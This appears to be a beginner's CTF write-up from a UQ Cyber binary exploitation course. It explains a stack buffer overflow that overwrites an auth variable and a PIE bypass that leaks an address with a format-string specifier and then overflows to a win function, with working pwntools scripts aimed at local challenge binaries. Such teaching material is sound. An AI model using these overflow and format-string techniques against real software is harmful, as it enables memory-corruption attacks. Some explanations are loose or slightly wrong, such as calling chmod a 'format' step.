  • UQ Cyber Introduction to Binary Exploitation (Pwntools)

    Getting Started


    Binary exploitation is all about finding vulnerabilities and using them for your purpose. In the introduction here, the array is given to you, in this particular example you can observe the following, obviously chmod +x "file" to format and ./"file" to run the CTF:


    Notice that in this binary, the auth variable sits perfectly after our buf array. This isn't always the case, but you can use Binary Ninja to check it! Using scanf with %s is extremely unsafe, as it lets us write as much data as we want. Your goal is to overflow buf and overwrite the auth variable.



    What is the CTF saying?


    Okay, let's break this down step by step, as the information in the image suggests we have two parts here, one part which is our buf and the second part which is where we want to write our win condition, our auth variable.


    In order to reach the win condition we have to full the buf with gibberish, since you are writing alphanumerical to ASCII you can write 44 A's to just fill it up.


    After doing that we can see that our 7b has turned into 00. This means we can start writing in the auth variable


    Our Solution


    Since this is meant to introduce you to pwntools, I'll go into how to do this in using that, first you have to run the following


    
python3 -m venv venv
source ./venv/bin/activate
pip install pwntools

    After this we can start to use pwntools, doing nano ctf1.py will let you start writing to a python file


    
from pwn import *

p = process("./chal2h")

payload = b"A"*44 + b"\x67\x00\x00\x00"

p.sendline(payload)
p.interactive()

    Breaking it down line by line here, this code:


    1. Imports pwntools


    2. Runs ./chal2h in your terminal to start the challenge


    3. Sets a command you want to run which in this case is b"A"*44 + b"\x67\x00\x00\x00" the reason for these b's and the \x67\x00 etc. is because b denotes the text as "raw" or in byte format, and the \x67\x00 etc. writes to each individual byte.


    4. Sends the command you just denoted


    5. Accesses the code and you can see the result, essentially if you were correct or not


    Since you've written the code python ctf1.py should show that you have properly completed this CTF :)

  • Time for some pie!

    Getting Started


    Adding PIE essentailly means addresses are randomised, this gives us a challenge when doing our well...challenge, obviously chmod +x "file" to format it


    Since addresses are randomised, we can employ pwndbg, to find out where our leak will be located, which should be at main. using pwndbg pieleak in our terminal, then run, then vmmap to find our main gives us the following:



    So What Do I Do Now?


    Okay, let's break this down step by step, now that we know what our leak should look like, using %n$p to find our leak gives us %21$p which looks promising:


    Testing this leak in pwndbg gives us 0x5555555544cf, which means its inside our main, looking at binary ninja, we can locate the main and win binaries at 0x4cf and 0x4b9, which is 16 apart in hex.


    With all this information we can write our script to complete the CTF


    Our Solution


    It's best to utilise pwntools here, first you have to run the following


    
python3 -m venv venv
source ./venv/bin/activate
pip install pwntools

    After this we can start to use pwntools, doing nano pieleak1.py will let you start writing to a python file


    
from pwn import *

p = process("./pieleak")
gdb.attach(p)
p.sendline("%21$p")
leak = p.recvline()
parsed = int(leak, 16)

offset = 0x4cf
base = parsed - offset
win = 0x4b9
win_addr = base + win
print(hex(win_addr))

p.sendline(b"A"*72+p64(win_addr))
p.interactive()

    Breaking it down line by line here, this code:


    1. Imports pwntools


    2. Runs ./pieleak in your terminal to start the challenge


    3. Attaches gbd, which is actually our pwndbg.


    4. We send our leak "%21$p", then associate that to a variable, getting the base 16.


    5. We calculate the offset, using the main and parsed value, and find the win address using the value from binary ninja and base.


    6. Calculates the end win address and overflows 72 bytes to access the binary. This then uses p64 to send the end win address as raw bytes.


    Since you've written the code python pieleak1.py should show that you have properly completed this CTF :)
